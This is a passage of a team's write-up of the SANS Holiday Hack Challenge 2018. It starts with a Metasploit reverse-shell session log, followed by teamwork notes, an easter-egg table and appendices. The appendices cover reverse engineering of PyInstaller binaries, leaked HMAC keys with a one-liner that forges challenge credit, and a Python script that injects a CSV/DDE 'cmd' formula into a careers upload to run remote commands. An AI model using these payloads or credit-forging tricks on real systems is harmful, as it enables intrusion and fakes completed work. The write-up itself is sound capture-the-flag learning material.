msf exploit(handler) &gt;
[*] Started reverse TCP handler on 1.2.3.4:4444
[*] Meterpreter session 2 opened (1.2.3.4:4444 -&gt; 35.231.207.76:49921) at 2019-01-14 19:56:47 +0000
[*] Session ID 2 (1.2.3.4:4444 -&gt; 35.231.207.76:49921) processing AutoRunScript 'post/windows/manage/migrate SPAWN=false PID=2864'
[*] Running module against HHC18-DDE
[*] Current server process: powershell.exe (3296)
[+] Migrating to 2864
[+] Successfully migrated to process 2864
</pre>

<p>
At this point, we tried a few things (and were able to recover
Sparkle's password hash through an SMB relay attack), but the
escalation paths we saw risked the stability of the game, and we
didn't pursue the matter.
</p>
</div>
</div>
</div>

<div id="outline-container-org5a92f8c" class="outline-2">
<h2 id="teamwork"><a id="org5a92f8c"></a>Working as a Team</h2>
<div class="outline-text-2" id="text-teamwork">
<p>
While working on this challenge, we used three main techniques to get
things done and stay organized. We were mostly working in the same
room that happened to have a couple of big whiteboards. Those came in
handy as we slowly drew out the map of the game and location of all
things in it. We also originally tracked our progress using this. The
whiteboards also came in handy as a way to quickly iterate through
ideas on specific challenges we faced.
</p>


<div class="figure">
<p><img src="./imgs/team_whiteboard1.png" alt="team_whiteboard1.png" />
</p>
<p><span class="figure-number">Figure 64: </span>Map Whiteboard</p>
</div>

<p>
The use of a private Slack channel was also very helpful. It existed
as a place to both dump answers, clues, and interesting artifacts, as
well as a good place for discussion for when we weren’t in the same
room.
</p>


<div class="figure">
<p><img src="./imgs/team_whiteboard2.png" alt="team_whiteboard2.png" />
</p>
<p><span class="figure-number">Figure 65: </span>Progress Whiteboard</p>
</div>

<p>
Our final method for working was using a private GitHub repo. We
didn’t want to have a public one because we didn’t want to spoil
things for others, nor did we want to give away any advantage we had or
secrets we found. GitHub was very useful for a place for more well
defined to do list. We used GitHub issues to track what we still
needed to do and chat about who was doing what. Labelling issues
helped us to prioritize this to do list so we could make sure to
finish up the challenge with the most impactful parts done.
</p>

<p>
All in all, using these collaboration techniques allowed us to be as
comprehensive as we could with both the challenge and the
end report.
</p>
</div>
</div>
<div id="outline-container-org6417c5a" class="outline-2">
<h2 id="eggs"><a id="org6417c5a"></a>Easter Eggs</h2>
<div class="outline-text-2" id="text-eggs">
<p>
A quick list of easter eggs that we found as we were going through the game.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Egg</th>
<th scope="col" class="org-left">Location</th>
<th scope="col" class="org-left">Reference</th>
<th scope="col" class="org-left">Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">OHHIMARK</td>
<td class="org-left">LineCon/KringleCon</td>
<td class="org-left">The Room</td>
<td class="org-left">WebSocket Message</td>
</tr>

<tr>
<td class="org-left">"Wake up, we're at Grandma's"</td>
<td class="org-left">LineCon/KringleCon</td>
<td class="org-left">MST3k</td>
<td class="org-left">WebSocket Message</td>
</tr>

<tr>
<td class="org-left">egg.png</td>
<td class="org-left">LineCon/KringleCon</td>
<td class="org-left">Twitter Egg Logo</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">a-wild-missingno-appears</td>
<td class="org-left">LineCon/KringleCon</td>
<td class="org-left">Pokemon</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Lethal ForensicELFification</td>
<td class="org-left">Terminal</td>
<td class="org-left"><a href="https://digital-forensics.sans.org/community/lethal-forensicator">Lethal Forensicator</a></td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Lethal ForensicELFification</td>
<td class="org-left">Terminal</td>
<td class="org-left"><i>The Raven</i></td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left"><code>-a 42</code></td>
<td class="org-left">Stall Mucking Argument</td>
<td class="org-left">Hitchhiker's Guide</td>
<td class="org-left">smbwrapper command argument</td>
</tr>

<tr>
<td class="org-left"><code>ignore-sw-holiday-special</code></td>
<td class="org-left">Stall Mucking Argument</td>
<td class="org-left">Star Wars Holiday Special &amp; 2016 HHC</td>
<td class="org-left">smbwrapper command argument</td>
</tr>

<tr>
<td class="org-left">directreindeerflatterystable</td>
<td class="org-left">Stall Mucking Password</td>
<td class="org-left"><a href="https://xkcd.com/936/">XKCD</a></td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">KONAMI CODE</td>
<td class="org-left">Yule Log Analysis</td>
<td class="org-left"><a href="http://contra.wikia.com/wiki/Konami_Code">Konami Code</a> and 2015 HHC</td>
<td class="org-left">In reverse-engineered code</td>
</tr>

<tr>
<td class="org-left">Escape from LA</td>
<td class="org-left">Python Terminal</td>
<td class="org-left">Escape from LA movie ("Snake is Back!")</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Candy Striper</td>
<td class="org-left">CURLing Terminal</td>
<td class="org-left">2017 HHC</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">EE2 (CranPi Logo)</td>
<td class="org-left">GitLab</td>
<td class="org-left">Old HHCs, Raspberry Pi</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">EE3 (Drawing of Hans)</td>
<td class="org-left">GitLab</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Theo Authorized User</td>
<td class="org-left">Scan-O-Matic Database</td>
<td class="org-left">Die Hard (he was the hacker)</td>
<td class="org-left">Only authorized and enabled user</td>
</tr>

<tr>
<td class="org-left">Bill Clay</td>
<td class="org-left">Wannacookie HTML Source</td>
<td class="org-left">Die Hard (Hans' alias)</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">InigoMontoya</td>
<td class="org-left">Vents Code</td>
<td class="org-left">Princess Bride</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Happy Trails</td>
<td class="org-left">Answer 1</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">John McClane</td>
<td class="org-left">Answer 2</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Yippee-ki-yay</td>
<td class="org-left">Answer 4</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">19880715</td>
<td class="org-left">Answer 5</td>
<td class="org-left">Die Hard</td>
<td class="org-left">Movie release date</td>
</tr>

<tr>
<td class="org-left">Fancy Beaver</td>
<td class="org-left">Answer 7</td>
<td class="org-left">Fancy Bear APT Group</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">erohetfanu.com</td>
<td class="org-left">Answer 10</td>
<td class="org-left">Die Hard</td>
<td class="org-left">hansgruber ROT-13 and backwards</td>
</tr>

<tr>
<td class="org-left">yippeekiyaa.aaay</td>
<td class="org-left">Answer 11</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Piano Lock &amp; Rachmaninoff</td>
<td class="org-left">Answer 12</td>
<td class="org-left">Willy Wonka</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Many Hans quotes</td>
<td class="org-left">KringleCon</td>
<td class="org-left">Die Hard</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Toy Soldier quotes</td>
<td class="org-left">KringleCon</td>
<td class="org-left">Die Hard</td>
<td class="org-left">From Hans' German-speaking associates</td>
</tr>

<tr>
<td class="org-left">Dungeon for Errant Reindeer</td>
<td class="org-left">Hans Quote</td>
<td class="org-left">2016 HHC</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">ATNAS Corporation, Miss Cindy Lou Who</td>
<td class="org-left">Hans Quote</td>
<td class="org-left">2015 HHC</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Glinda the Good Witch</td>
<td class="org-left">Hans Quote</td>
<td class="org-left">2017 HHC</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">The Plant</td>
<td class="org-left">Front Door</td>
<td class="org-left">Previous HHCs, psmitty</td>
<td class="org-left">First person to get all challenge coins!</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgf1de5bc" class="outline-2">
<h2 id="orgf1de5bc">Thank Yous</h2>
<div class="outline-text-2" id="text-orgf1de5bc">
<p>
As proud as we are to have completed this Holiday Hack Challenge, we
would be remiss to not publicly acknowledge a few people outside of
this team who helped us during the challenge.
</p>

<p>
Justin Azoff (Corelight): Helped greatly on the <a href="#obj5">Scan-O-Matic</a> as well as some other thoughts and ideas throughout
</p>

<p>
Michael Sinatra (ESnet): Helped us figure out why we were unable to query <a href="#obj93">Hans’ DNS resolver</a> from Linux/macOS at first (search for noedns for more info)
</p>

<p>
Nick Buraglio (ESnet): Thanks to his time pretending to be Randall from the movie “Clerks” he immediately thought of the musical lock in Charlie and the Chocolate Factory when we were first stuck on that
</p>

<p>
We're also very grateful to SANS for this event, recognizing all the hard work that went into it.
</p>

<p>
But, most of all, we also need to thank our significant others
for putting up with our efforts leading to some late nights and busy
weekends. We all may need to stop at the florist on the way home
today.
</p>
</div>
</div>

<div id="outline-container-org8bcb3b3" class="outline-2">
<h2 id="appendix_reversing"><a id="org8bcb3b3"></a>Appendix 1: Reverse Engineering PyInstaller Binaries</h2>
<div class="outline-text-2" id="text-appendix_reversing">
<p>
On some of the terminals, we would need to invoke a command, such as
<code>runtoanswer</code> and provide the correct answer in order to receive
credit for that terminal. Other terminals would automatically invoke
a command once a certain condition has been met. Inspecting these
files, we discovered that they were standalone Linux ELF binaries,
which had been packaged by PyInstaller from a standalone Python
script. We wanted to recover the original Python script, and were able to do just that.
</p>

<ol class="org-ol">
<li><p>
Extracting the code object
</p>

<p>
PyInstaller provides a tool, <code>pyi-archive_viewer</code>, for inspecting archives and binaries created with it.
</p>

<p>
First, we install pyinstaller: <code>pip install pyinstaller</code>. Now we can use <code>pyi-archive_viewer</code> to inspect our file:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ pyi-archive_viewer -l runtoanswer
<span style="color: #b22222;">#  </span><span style="color: #b22222;">pos, length, uncompressed, iscompressed, type, name</span>
[(0, 158, 175, 1, <span style="color: #8b2252;">'m'</span>, u<span style="color: #8b2252;">'pyimod00_crypto_key'</span>),
 (158, 254, 332, 1, <span style="color: #8b2252;">'m'</span>, u<span style="color: #8b2252;">'struct'</span>),
 (412, 1144, 1992, 1, <span style="color: #8b2252;">'m'</span>, u<span style="color: #8b2252;">'pyimod01_os_path'</span>),
 (1556, 4460, 10063, 1, <span style="color: #8b2252;">'m'</span>, u<span style="color: #8b2252;">'pyimod02_archive'</span>),
 (6016, 7539, 19710, 1, <span style="color: #8b2252;">'m'</span>, u<span style="color: #8b2252;">'pyimod03_importers'</span>),
 (13555, 1900, 4513, 1, <span style="color: #8b2252;">'s'</span>, u<span style="color: #8b2252;">'pyiboot01_bootstrap'</span>),
 (15455, 2182, 18185, 1, <span style="color: #8b2252;">'s'</span>, u<span style="color: #8b2252;">'psmenu'</span>),
 ...
</pre>
</div>

<p>
An ELF binary can have arbitrary data at the end of the file, and
in our case, PyInstaller appends an archive with scripts,
modules, and even shared objects that it needs to run the script.
</p>

<p>
In this instance, we want the script <code>psmenu</code>, which is at offset
15,455 relative to the start of the archive (note: not from the
beginning of the ELF binary). The script has a length of 2,182
bytes compressed, and 18,185 uncompressed. The type denotes that
it's a script, and its original name was <code>psmenu</code>.
</p>

<p>
We can create a one-liner to generate the name of the script we want to extract:
</p>

<pre class="example">
pyi-archive_viewer -l runtoanswer | grep -A1 bootstrap | tail -n 1 | cut -f 4 -d"'"
</pre>

<p>
We're grabbing the line which comes after bootstrap, and then we're grabbing the 4th field, as delimited by single-quotes.
</p>

<p>
Now we can use <code>pyi-archive_viewer</code> to extract and uncompress our file:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ pyi-archive_viewer runtoanswer
...
? x psmenu
to filename? psmenu.extracted
? q
</pre>
</div></li>

<li><p>
Converting the code object to a .pyc file
</p>

<p>
After some investigation, it turned out that what we've extracted
is just a Python code object. We can import it into Python and
view a disassembly, but in order to use some decompiling tools to
try to recover source code, we need to have a byte-compiled
Python file. To convert it, we just need to add a few bytes of
header values. The easiest way to do this is just to extract
another file, which is a valid pyc file, and copy the bytes from
its header. We use <code>pyi-archive_viewer</code> to extract
<code>pyimod03_importers</code>, and we can verify that it has the right
header:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ file *
psmenu.extracted:     data
pyimod03_importers:   python 3.5.2+ byte-compiled
</pre>
</div>

<p>
The pyc file format calls for a 12-byte header, so we can grab the first 12 bytes using <code>dd</code> and save it to a file:
</p>

<div class="org-src-container">
<pre class="src src-sh">dd <span style="color: #a0522d;">if</span>=pyimod03_importers <span style="color: #a0522d;">of</span>=pyc_header <span style="color: #a0522d;">bs</span>=1 <span style="color: #a0522d;">count</span>=12
</pre>
</div>

<p>
Next we simply concatenate the two files: <code>cat pyc_header psmenu.extracted &gt; psmenu.pyc</code>.
</p></li>

<li><p>
Decompiling the .pyc file
Now that we have a valid .pyc file, we can use <code>uncompyle6</code> to convert it back to a Python script:
</p>

<div class="org-src-container">
<pre class="src src-sh">uncompyle6 psmenu.pyc &gt; psmenu.py
</pre>
</div></li>
</ol>
</div>
</div>
<div id="outline-container-org4164b26" class="outline-2">
<h2 id="appendix_hmac"><a id="org4164b26"></a>Appendix 2: Game Internals: HMACs and Hidden Terminal Messages</h2>
<div class="outline-text-2" id="text-appendix_hmac">
<p>
In order to receive credit for successfully completing a game
objective, such as a Cranberry Pi terminal challenge, or an
objective, <abbr title="Hash-based Message Authentication Code"> HMAC</abbr>s
are used. In this section, we'll discuss how they're used, and how
we were able to forge these after stealing the keys for some of the
challenges.
</p>
</div>
<div id="outline-container-orgbc5ad0b" class="outline-3">
<h3 id="orgbc5ad0b">Recovering the HMAC keys</h3>
<div class="outline-text-3" id="text-orgbc5ad0b">
<p>
After <a href="#appendix_reversing">reverse engineering</a> one of the <code>runtoanswer</code> binaries on a
Cranberry Pi system, we can see how the scripts generate the
<abbr title="Hash-based Message Authentication Code"> HMAC</abbr>:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> hmac

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">calcHmac</span>(secret, resourceId):
    <span style="color: #a020f0;">return</span> hmac.new(secret.encode(<span style="color: #8b2252;">'utf8'</span>), resourceId.encode(<span style="color: #8b2252;">'utf8'</span>), sha256).hexdigest()

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">printResponse</span>(<span style="color: #483d8b;">hash</span>, resourceId):
    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">'#####hhc:%s#####'</span> % json.dumps({<span style="color: #8b2252;">'hash'</span>: <span style="color: #483d8b;">hash</span>, <span style="color: #8b2252;">'resourceId'</span>: resourceId}))

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    <span style="color: #a0522d;">RESOURCEID</span> = os.environ.get(<span style="color: #8b2252;">'RESOURCE_ID'</span>)

    <span style="color: #a0522d;">key</span> = <span style="color: #8b2252;">'2bb6b9c702834095a9c3284e053da124'</span>
    <span style="color: #a0522d;">h</span> = hmac.new(key.encode(<span style="color: #8b2252;">'utf8'</span>), RESOURCEID.encode(<span style="color: #8b2252;">'utf8'</span>), sha256)
    <span style="color: #a0522d;">payload</span> = {<span style="color: #8b2252;">'hash'</span>: h.hexdigest(),<span style="color: #8b2252;">'resourceid'</span>: RESOURCEID}

    <span style="color: #a0522d;">hmac256</span> = calcHmac(key, RESOURCEID)
    printResponse(hmac256, RESOURCEID)
</pre>
</div>


<p>
Each in-game element (terminal, objective, etc.) has a unique
resource ID, and each user receives different resource IDs. These
IDs are passed to the terminal via a GET parameter.
</p>

<p>
The terminals print a special message, which is hidden by the
JavaScript TTY terminal.
</p>

<p>
We can create a bash one-liner to just give ourselves credit for this challenge, without actually solving it:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">RESULT</span>=$(<span style="color: #483d8b;">echo</span> -n RESOURCE_ID | openssl dgst -sha256 -hmac 48e41d5cc5e041c0869395bb8cab791e | sed <span style="color: #8b2252;">'s/^.* //'</span>); <span style="color: #8b2252;">\</span>
<span style="color: #483d8b;">echo</span>; <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'#####hhc:{"hash": "'</span>$<span style="color: #a0522d;">RESULT</span><span style="color: #8b2252;">'", "resourceId": "'</span>$<span style="color: #a0522d;">RESOURCE_ID</span><span style="color: #8b2252;">'"}#####'</span>
</pre>
</div>

<p>
This duplicates the logic in the Python script. It uses OpenSSL to
calculate the <abbr title="Hash-based Message Authentication Code">
   HMAC</abbr>, and then it prints the hidden message, which causes the
game to give us credit.
</p>
</div>
</div>
<div id="outline-container-org42cd195" class="outline-3">
<h3 id="org42cd195">Challenge Keys</h3>
<div class="outline-text-3" id="text-org42cd195">
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Terminal</th>
<th scope="col" class="org-left">Direct URL</th>
<th scope="col" class="org-left">HMAC Key</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Essential Editor Skills</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=viescape&amp;resource_id=1">viescape</a></td>
<td class="org-left">2bb6b9c702834095a9c3284e053da124</td>
</tr>

<tr>
<td class="org-left">The Name Game</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=pwshmenu&amp;resource_id=2">pwshmenu</a></td>
<td class="org-left">78871929eec84c94806623a086b376f0</td>
</tr>

<tr>
<td class="org-left">Lethal ForensicELFification</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=viminfo&amp;resource_id=3">viminfo</a></td>
<td class="org-left">48e41d5cc5e041c0869395bb8cab791e</td>
</tr>

<tr>
<td class="org-left">Stall Mucking Report</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=plaintext-creds&amp;resource_id=4">plaintext-creds</a></td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">CURLing Master</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=http2&amp;resource_id=5">http2</a></td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">Yule Log Analysis</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=spray-detect&amp;resource_id=6">spray-detect</a></td>
<td class="org-left">81013803273d4c58b0e2e5ed869c3677</td>
</tr>

<tr>
<td class="org-left">Dev Ops Fail</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=gitpasshist&amp;resource_id=7">gitpasshist</a></td>
<td class="org-left">32f7f08dbb014bb3a288ecc9ecce1486</td>
</tr>

<tr>
<td class="org-left">Python Escape from LA</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=python_docker_challenge&amp;resource_id=8">python_docker_challenge</a></td>
<td class="org-left">09f90c21d59845a7b0c972b8e871e8fe</td>
</tr>

<tr>
<td class="org-left">The Sleighbell Lottery</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=unlinked-function&amp;resource_id=9">unlinked-function</a></td>
<td class="org-left">a6ec0e49731b4c29907422c23794b9a6</td>
</tr>

<tr>
<td class="org-left">Snort</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=snort&amp;resource_id=10">snort</a></td>
<td class="org-left">4069e612c5d44c69b9ba302ce63968d7</td>
</tr>
</tbody>
</table>

<p>
The Sleighbell Lottery key was recovered with <code>gdb</code>.
</p>
</div>
</div>
</div>

<div id="outline-container-org2323028" class="outline-2">
<h2 id="appendix_tools"><a id="org2323028"></a>Appendix 3: Scripts and Tools</h2>
<div class="outline-text-2" id="text-appendix_tools">
<p>
As part of this report, we're releasing our scripts and tools at: <a href="https://github.com/esnet/sans-holiday-hack-2018">https://github.com/esnet/sans-holiday-hack-2018</a>
</p>

<p>
Some select tools, which were mentioned in this report are listed below:
</p>
</div>
<div id="outline-container-org080f20d" class="outline-3">
<h3 id="org080f20d">Scan-O-Matic</h3>
<div class="outline-text-3" id="text-org080f20d">
<p>
We wrote this simple script to create and upload a QR code:
</p>

<div class="org-src-container">
<pre class="src src-sh" id="org6ef58ee"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/</span><span style="color: #a020f0;">bash</span>

<span style="color: #a0522d;">BADGE</span>=$(mktemp -t badge)

<span style="color: #a0522d;">CMD</span>=<span style="color: #8b2252;">"$1"</span>

qrencode -t ansi <span style="color: #8b2252;">"$CMD"</span> -o $<span style="color: #a0522d;">BADGE</span> -t PNG

mv $<span style="color: #a0522d;">BADGE</span> $<span style="color: #a0522d;">BADGE</span>.png

curl -s <span style="color: #8b2252;">'https://scanomatic.kringlecastle.com/upload'</span> -H <span style="color: #8b2252;">'X-Requested-With: XMLHttpRequest'</span> -H <span style="color: #8b2252;">'Cookie: resource_id=false'</span> -H <span style="color: #8b2252;">'Connection: keep-alive'</span> -F <span style="color: #8b2252;">"barcode=@$BADGE.png"</span>

rm $<span style="color: #a0522d;">BADGE</span>.png
</pre>
</div>

<p>
We wanted to used tools that can automatically map SQL databases, such as <code>sqlmap</code>, but they all use URLs, and not QR codes. So we hacked together this script, which calls the badge shell script, and just acts as a go-between:
</p>

<div class="org-src-container">
<pre class="src src-python" id="org1aab652"><span style="color: #a020f0;">from</span> subprocess <span style="color: #a020f0;">import</span> Popen, PIPE
<span style="color: #a020f0;">import</span> urllib

<span style="color: #a020f0;">from</span> flask <span style="color: #a020f0;">import</span> Flask, request, jsonify
<span style="color: #a0522d;">app</span> = Flask(<span style="color: #483d8b;">__name__</span>)

<span style="color: #228b22;">@app.route</span>(<span style="color: #8b2252;">'/'</span>)
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">proxy</span>():
    <span style="color: #a0522d;">uid</span> = urllib.unquote(request.args.get(<span style="color: #8b2252;">'uid'</span>, <span style="color: #8b2252;">''</span>))
    <span style="color: #a0522d;">p</span> = Popen([<span style="color: #8b2252;">'bash'</span>, <span style="color: #8b2252;">'./upload.sh'</span>, uid], stdin=PIPE, stdout=PIPE, stderr=PIPE)
    <span style="color: #a0522d;">output</span>, <span style="color: #a0522d;">err</span> = p.communicate()
    <span style="color: #a020f0;">return</span> jsonify(output)
</pre>
</div>
</div>
</div>
<div id="outline-container-orgb0b7070" class="outline-3">
<h3 id="orgb0b7070">Careers</h3>
<div class="outline-text-3" id="text-orgb0b7070">
<p>
Uploading a CSV file by hand became old fast, so we wrote this:
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgcd9913f"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>

<span style="color: #a020f0;">import</span> sys
<span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">import</span> uuid

<span style="color: #a020f0;">import</span> requests

<span style="color: #a0522d;">cmd</span> = sys.argv[1]

<span style="color: #a0522d;">output</span> = uuid.uuid4().<span style="color: #483d8b;">hex</span> + <span style="color: #8b2252;">'.txt'</span>

<span style="color: #a0522d;">data</span> = {<span style="color: #8b2252;">'firstname'</span>: <span style="color: #8b2252;">'Willy'</span>, <span style="color: #8b2252;">'lastname'</span>: <span style="color: #8b2252;">'Wonka'</span>, <span style="color: #8b2252;">'phone'</span>: <span style="color: #8b2252;">'1234567890'</span>, <span style="color: #8b2252;">'email'</span>: <span style="color: #8b2252;">'willy@wonka.com'</span>}
<span style="color: #a0522d;">files</span> = {<span style="color: #8b2252;">'csv'</span>: (<span style="color: #8b2252;">'work_history.csv'</span>, <span style="color: #8b2252;">"=cmd|'/C %s &gt; C:\\careerportal\\resources\\public\\%s 2&gt;&amp;1'!A0"</span> % (cmd, output))}

<span style="color: #a0522d;">r</span> = requests.post(<span style="color: #8b2252;">'https://careers.kringlecastle.com/api/upload/application'</span>, data=data, files=files)

<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Submitted, and recieved"</span>, r.status_code
<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">'Result should be in https://careers.kringlecastle.com/public/'</span> + output

<span style="color: #a020f0;">while</span> <span style="color: #008b8b;">True</span>:
    <span style="color: #a0522d;">r</span> = requests.get(<span style="color: #8b2252;">'https://careers.kringlecastle.com/public/'</span> + output)
    <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'404 Error!'</span> <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> r.text:
        <span style="color: #a020f0;">print</span> r.text[2:].decode(<span style="color: #8b2252;">'utf-16'</span>)
        <span style="color: #a020f0;">break</span>
    <span style="color: #a020f0;">else</span>:
        <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Not yet..."</span>
        time.sleep(5)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(sys.argv) == 3:
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(<span style="color: #8b2252;">"output/"</span> + sys.argv[2], <span style="color: #8b2252;">'wb'</span>) <span style="color: #a020f0;">as</span> f:
        f.write(<span style="color: #483d8b;">str</span>(r.text[2:].decode(<span style="color: #8b2252;">'utf-16'</span>)))
</pre>
</div>

<p>
It takes a command as an argument, will upload it, and then poll the server to get the result.
</p>
</div>
</div>

<div id="outline-container-orgc90009d" class="outline-3">
<h3 id="orgc90009d">Malware</h3>
<div class="outline-text-3" id="text-orgc90009d">
<p>
We used the following script to search for other files the malware author may have left on the system:
</p>

<div class="org-src-container">
<pre class="src src-python" id="orgb433396"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/usr/bin/env python</span>

<span style="color: #a020f0;">import</span> binascii
<span style="color: #a020f0;">import</span> sys

<span style="color: #a020f0;">import</span> dns.name
<span style="color: #a020f0;">import</span> dns.resolver

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(sys.argv) &lt; 2:
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Usage: filename"</span>
    sys.<span style="color: #008b8b;">exit</span>(1)

<span style="color: #a0522d;">PATH</span> = <span style="color: #8b2252;">"erohetfanu_exfil"</span>

<span style="color: #a0522d;">erohet</span> = dns.resolver.Resolver()
<span style="color: #a0522d;">erohet.nameservers</span> = [<span style="color: #8b2252;">'104.196.126.19'</span>]

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">query</span>(name):
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Querying"</span>, name
    <span style="color: #a0522d;">result</span> = erohet.query(<span style="color: #8b2252;">"%s.erohetfanu.com"</span> % name, <span style="color: #8b2252;">"TXT"</span>).response.answer[0][-1].strings[0]
    <span style="color: #a020f0;">return</span> result

<span style="color: #a0522d;">filename</span> = sys.argv[1]
<span style="color: #a0522d;">hex_file</span> = binascii.hexlify(filename)

<span style="color: #a0522d;">result</span> = query(hex_file)
<span style="color: #a020f0;">if</span> result == <span style="color: #8b2252;">"404NOTFOUND"</span>:
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"File does not exist"</span>
    sys.<span style="color: #008b8b;">exit</span>(1)
<span style="color: #a020f0;">try</span>:
    <span style="color: #a0522d;">chunks</span> = <span style="color: #483d8b;">int</span>(result)
<span style="color: #a020f0;">except</span> <span style="color: #228b22;">ValueError</span>:
    <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Suspicious value"</span>, result
    <span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(PATH + <span style="color: #8b2252;">"/suspicious"</span>, <span style="color: #8b2252;">'a'</span>) <span style="color: #a020f0;">as</span> f:
        f.write(filename + <span style="color: #8b2252;">": "</span> + result + <span style="color: #8b2252;">"\n"</span>)
    sys.<span style="color: #008b8b;">exit</span>(1)

<span style="color: #a0522d;">filename</span> = filename.replace(<span style="color: #8b2252;">".."</span>, <span style="color: #8b2252;">"&lt;DOTDOT&gt;"</span>)
<span style="color: #a0522d;">filename</span> = filename.replace(<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">"&lt;SLASH&gt;"</span>)

<span style="color: #a020f0;">with</span> <span style="color: #483d8b;">open</span>(PATH + <span style="color: #8b2252;">"/%s"</span> % filename, <span style="color: #8b2252;">'wb'</span>) <span style="color: #a020f0;">as</span> f:
    <span style="color: #a020f0;">for</span> chunk <span style="color: #a020f0;">in</span> <span style="color: #483d8b;">range</span>(chunks):
        <span style="color: #a020f0;">if</span> chunks &gt; 1000 <span style="color: #a020f0;">and</span> chunk % 100 == 0 <span style="color: #a020f0;">and</span> chunk != 0:
            <span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"On chunk"</span>, chunk
        f.write(binascii.unhexlify(query(<span style="color: #8b2252;">"%s.%s"</span> % (chunk, hex_file))))

<span style="color: #a020f0;">print</span> <span style="color: #8b2252;">"Written to"</span>, PATH + <span style="color: #8b2252;">"/%s"</span> % filename
</pre>
</div>
</div>
</div>
<div id="outline-container-org991b51f" class="outline-3">
<h3 id="org991b51f">Maze Solver</h3>
<div class="outline-text-3" id="text-org991b51f">
<div class="org-src-container">
<pre class="src src-python" id="org012e887"><span style="color: #b22222;"># </span><span style="color: #b22222;">Python 3</span>

<span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">import</span> re
<span style="color: #a020f0;">import</span> time

<span style="color: #a0522d;">location_keys</span> = {}
<span style="color: #a0522d;">location_shafts</span> = {}

